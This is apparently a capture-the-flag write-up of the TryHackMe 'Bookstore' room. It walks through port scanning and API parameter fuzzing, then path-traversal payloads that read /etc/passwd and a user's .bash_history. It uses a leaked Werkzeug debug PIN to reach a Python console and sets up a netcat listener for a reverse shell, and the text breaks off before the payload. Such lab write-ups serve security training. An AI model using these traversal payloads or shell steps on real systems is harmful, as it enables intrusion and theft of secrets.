# Try Hack Me - Bookstore
# Author: Atharva Bordavekar
# Difficulty: Medium
# Points: 60
# Vulnerabilities:

# Phase 1 - Reconnaissance:

nmap scan:

```bash
nmap -p- --min-rate=1000 <target_ip>
```
PORT     STATE SERVICE

22/tcp   open  ssh

80/tcp   open  http

5000/tcp open  upnp

so lets start enumerating the website at port 80. after some manual searching, i found out that there is a login page at /login.html. i tried sql injections and XSS payloads but it did not work. but i found something interesting in the source code.

so we have just found a possible username named sid. i tried to burteforce the login page but then i realised in the comment it said that the webpage was not even working. so its just a dummy login page which does not accept http POST method. now lets move on to the port 5000. using the -sC and the -sV flags to find out what service is exactly is going on that port.

```bash
nmap -p 5000 -sC -sV <target_ip>
```
PORT     STATE SERVICE VERSION

5000/tcp open  http    Werkzeug httpd 0.14.1 (Python 3.6.9)

|_http-server-header: Werkzeug/0.14.1 Python/3.6.9

| http-robots.txt: 1 disallowed entry 

|_/api </p> 

|_http-title: Home

we can see there is a robots.txt file present. lets visit it.

after visting the /api endpoint, i could find some other endpoints aswell. the version of the REST api is v2.0 i tried to fuzz the api for the version 2.0 but i failed. considering the assumption that the previous versions would be v1.0. so lets fuzz the /api/v1... endpoint. also make sure that you are fuzzinf at the right place, as our main target will be the /books endpoint since it looks like a possible LFI exploit.

```bash
ffuf -u http://<target_ip>:5000/api/v1/resources/books?FUZZ=test -w /usr/share/wordlists/dirb/common.txt
```

we get a show parameter which throws a 500 status code. this looks interesting, lets test out LFI on this parameter.

```bash
http://<target_ip>:5000/api/v1/resources/books?show=../../../../etc/passwd
```
and just like that we can see that it is vulnerable to LFI. as we know that we had found a hint before which revealed some secret code in the .bash_history of the user sid. lets traverse to that location

```bash
http://<target_ip>:5000/api/v1/resources/books?show=../../../../home/sid/.bash_history
```
now this reveals us a WERKZEUG_DEBUG_PIN. i did not know where to use this pin, so i carried out a directory fuzz on the port 5000 website. 

```bash
gobuster dir -u http://<target_ip>:5000 -w /usr/share/wordlists/dirb/common.txt 
```
api                  (Status: 200) [Size: 825]

console              (Status: 200) [Size: 1985]

robots.txt           (Status: 200) [Size: 45]

lets enter the code in the input field of the /console directory. as we can see, we get a console which interprets python code. this is useful as we can exploit this to get a reverse shell from ![python_reverseshells](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#python) . just make sure that you change your attacker ip and port.

```bash
# first setup a netcat listner:
nc -lnvp 4444
```
```bash
# now send the payload to the console:
